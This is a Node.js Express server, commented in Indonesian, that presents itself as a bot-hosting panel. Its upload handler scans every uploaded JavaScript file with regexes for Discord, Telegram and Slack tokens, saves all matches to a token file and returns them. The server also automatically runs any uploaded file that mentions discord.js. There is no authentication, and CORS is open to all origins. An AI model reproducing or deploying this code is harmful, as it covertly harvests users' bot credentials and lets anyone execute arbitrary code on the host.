const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const { exec } = require('child_process');

const app = express();
const PORT = process.env.PORT || 3000;

// **PERBAIKAN CORS UNTUK CHROME**
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
    credentials: true,
    optionsSuccessStatus: 200
}));

// Handle preflight requests
app.options('*', cors());

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// **FIX: Buat folder uploads jika tidak ada**
const uploadsDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadsDir)) {
    fs.mkdirSync(uploadsDir, { recursive: true });
}

// Database untuk token
const tokenDB = path.join(__dirname, 'tokens.db.json');

// **FIX: Storage configuration yang lebih baik**
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        const uploadDir = path.join(__dirname, 'uploads');
        // Bersihkan folder lama jika ada
        if (fs.existsSync(path.join(uploadDir, 'latest'))) {
            fs.rmSync(path.join(uploadDir, 'latest'), { recursive: true, force: true });
        }
        const newDir = path.join(uploadDir, 'latest');
        fs.mkdirSync(newDir, { recursive: true });
        cb(null, newDir);
    },
    filename: (req, file, cb) => {
        // Bersihkan nama file dari karakter aneh
        const cleanName = file.originalname.replace(/[^a-zA-Z0-9._-]/g, '_');
        cb(null, Date.now() + '_' + cleanName);
    }
});

const upload = multer({ 
    storage: storage,
    limits: {
        fileSize: 100 * 1024 * 1024, // 100MB max
        files: 100 // max 100 files
    }
});

// In-memory bot storage
let bots = [];
let tokens = [];

// Load existing tokens
if (fs.existsSync(tokenDB)) {
    try {
        tokens = JSON.parse(fs.readFileSync(tokenDB, 'utf8'));
    } catch (e) {
        tokens = [];
    }
}

// Save tokens to file
function saveTokens() {
    fs.writeFileSync(tokenDB, JSON.stringify(tokens, null, 2));
}

// **FIX: Endpoint test untuk cek koneksi**
app.get('/test', (req, res) => {
    res.json({ 
        status: 'online', 
        message: 'Server is running',
        timestamp: new Date().toISOString()
    });
});

// **FIX: 1. Upload files/folders dengan response lebih detail**
app.post('/upload', upload.array('files', 100), (req, res) => {
    try {
        const files = req.files;
        
        if (!files || files.length === 0) {
            return res.status(400).json({ 
                success: false, 
                message: 'No files uploaded' 
            });
        }
        
        let allTokens = [];
        
        files.forEach(file => {
            // Cek jika file adalah JavaScript
            if (file.originalname.endsWith('.js') || file.mimetype === 'application/javascript') {
                try {
                    const content = fs.readFileSync(file.path, 'utf8');
                    const foundTokens = extractTokens(content, file.originalname);
                    allTokens.push(...foundTokens);
                    
                    // **AUTO DEPLOY jika file bot**
                    if (content.includes('require(\'discord.js\')') || content.includes('const Discord = require')) {
                        autoDeployBot(file, content);
                    }
                } catch (readError) {
                    console.error('Error reading file:', readError);
                }
            }
        });
        
        res.json({ 
            success: true, 
            count: files.length,
            tokens: allTokens,
            message: `Successfully uploaded ${files.length} file(s)`
        });
        
    } catch (error) {
        console.error('Upload error:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Upload failed: ' + error.message 
        });
    }
});

// **FIX: 2. Upload dengan drag & drop folder**
app.post('/upload-folder', upload.array('files', 1000), (req, res) => {
    const files = req.files;
    const structure = req.body.structure ? JSON.parse(req.body.structure) : [];
    
    // Simpan struktur folder
    const folderData = {
        timestamp: new Date().toISOString(),
        fileCount: files.length,
        structure: structure,
        files: files.map(f => ({
            name: f.originalname,
            size: f.size,
            type: f.mimetype
        }))
    };
    
    fs.writeFileSync(
    path.join(process.cwd(), 'uploads', 'latest', 'folder_structure.json'),
    JSON.stringify(folderData, null, 2)
);
    
    res.json({ 
        success: true, 
        message: `Folder uploaded with ${files.length} files`,
        structure: structure
    });
});

// **FIX: 3. Endpoint untuk mendapatkan file yang sudah diupload**
app.get('/uploaded-files', (req, res) => {
    const uploadDir = path.join(__dirname, 'uploads', 'latest');
    const files = [];
    
    if (fs.existsSync(uploadDir)) {
        const fileList = fs.readdirSync(uploadDir);
        fileList.forEach(file => {
            const filePath = path.join(uploadDir, file);
            const stat = fs.statSync(filePath);
            files.push({
                name: file,
                size: stat.size,
                modified: stat.mtime,
                path: filePath
            });
        });
    }
    
    res.json(files);
});

// **FIX: 4. Deploy bot dengan validasi lebih baik**
app.post('/deploy', upload.single('botFile'), (req, res) => {
    try {
        const { botName, platform, botToken } = req.body;
        const file = req.file;
        
        if (!file) {
            return res.status(400).json({ 
                success: false, 
                message: 'No file provided' 
            });
        }
        
        // Validasi file
        if (!file.originalname.endsWith('.js')) {
            return res.status(400).json({ 
                success: false, 
                message: 'Only .js files are allowed' 
            });
        }
        
        // Save token jika ada
        if (botToken && botToken.trim() !== '') {
            const tokenExists = tokens.some(t => t.token === botToken.trim());
            if (!tokenExists) {
                tokens.push({
                    token: botToken.trim(),
                    source: 'manual_deploy',
                    platform: platform || 'discord',
                    botName: botName || 'Unnamed Bot',
                    timestamp: new Date().toISOString(),
                    active: true
                });
                saveTokens();
            }
        }
        
        // Create bot entry
        const botId = 'bot_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        const bot = {
            id: botId,
            name: botName || path.basename(file.originalname, '.js'),
            platform: platform || 'discord',
            status: 'running',
            filePath: file.path,
            startTime: new Date().toISOString(),
            pid: null
        };
        
        bots.push(bot);
        
        // Start bot process
        const process = startBotProcess(bot);
        bot.pid = process.pid;
        
        res.json({ 
            success: true, 
            botId: bot.id,
            message: `Bot ${bot.name} deployed successfully`,
            details: {
                name: bot.name,
                platform: bot.platform,
                file: file.originalname,
                started: bot.startTime
            }
        });
        
    } catch (error) {
        console.error('Deploy error:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Deployment failed: ' + error.message 
        });
    }
});

// **FIX: 5. Get all bots dengan status lengkap**
app.get('/bots', (req, res) => {
    // Update status bot berdasarkan process yang masih running
    bots.forEach(bot => {
        if (bot.pid) {
            try {
                // Cek jika process masih hidup
                process.kill(bot.pid, 0); // Signal 0 hanya untuk cek
                bot.status = 'running';
            } catch (e) {
                bot.status = 'stopped';
            }
        }
    });
    
    res.json(bots);
});

// **NEW: 6. Get server status**
app.get('/status', (req, res) => {
    res.json({
        status: 'online',
        serverTime: new Date().toISOString(),
        bots: bots.length,
        tokens: tokens.length,
        uptime: process.uptime(),
        memory: process.memoryUsage()
    });
});

// **FIX: Helper function untuk auto deploy**
function autoDeployBot(file, content) {
    const botId = 'auto_' + Date.now();
    const botName = path.basename(file.originalname, '.js');
    
    // Extract token dari file jika ada
    const tokenRegex = /[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}/;
    const tokenMatch = content.match(tokenRegex);
    
    if (tokenMatch) {
        const token = tokenMatch[0];
        if (!tokens.some(t => t.token === token)) {
            tokens.push({
                token: token,
                source: 'auto_extract',
                botName: botName,
                timestamp: new Date().toISOString()
            });
            saveTokens();
        }
    }
    
    const bot = {
        id: botId,
        name: botName,
        platform: 'discord',
        status: 'running',
        filePath: file.path,
        startTime: new Date().toISOString(),
        auto: true
    };
    
    bots.push(bot);
    startBotProcess(bot);
    
    console.log(`Auto-deployed bot: ${botName}`);
}

// **FIX: Fungsi startBotProcess yang lebih baik**
function startBotProcess(bot) {
    try {
        if (fs.existsSync(bot.filePath)) {
            const child = exec(`node "${bot.filePath}"`, {
                cwd: path.dirname(bot.filePath),
                detached: true
            });
            
            child.stdout.on('data', (data) => {
                console.log(`Bot ${bot.name}: ${data}`);
            });
            
            child.stderr.on('data', (data) => {
                console.error(`Bot ${bot.name} error: ${data}`);
            });
            
            child.on('close', (code) => {
                console.log(`Bot ${bot.name} exited with code ${code}`);
                const botIndex = bots.findIndex(b => b.id === bot.id);
                if (botIndex !== -1) {
                    bots[botIndex].status = 'stopped';
                }
            });
            
            return child;
        }
    } catch (error) {
        console.error(`Failed to start bot ${bot.name}:`, error);
    }
    return null;
}

// Helper functions tetap sama...
function extractTokens(content, source = 'unknown') {
    const tokenRegex = /[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}|[0-9]{10}:[A-Za-z0-9_-]{35}|MT[0-9][A-Za-z0-9]{23}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}|xoxb-[0-9]{12}-[0-9]{12}-[A-Za-z0-9]{24}/g;
    const matches = content.match(tokenRegex) || [];
    
    matches.forEach(token => {
        if (!tokens.some(t => t.token === token)) {
            tokens.push({
                token: token,
                source: source,
                timestamp: new Date().toISOString(),
                platform: detectPlatform(token)
            });
        }
    });
    
    saveTokens();
    return matches;
}

function detectPlatform(token) {
    if (token.startsWith('MT')) return 'discord';
    if (token.includes(':')) return 'telegram';
    if (token.startsWith('xoxb')) return 'slack';
    if (token.length === 59 && token.includes('.')) return 'discord';
    return 'unknown';
}

// **FIX: Start server dengan error handling**
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
});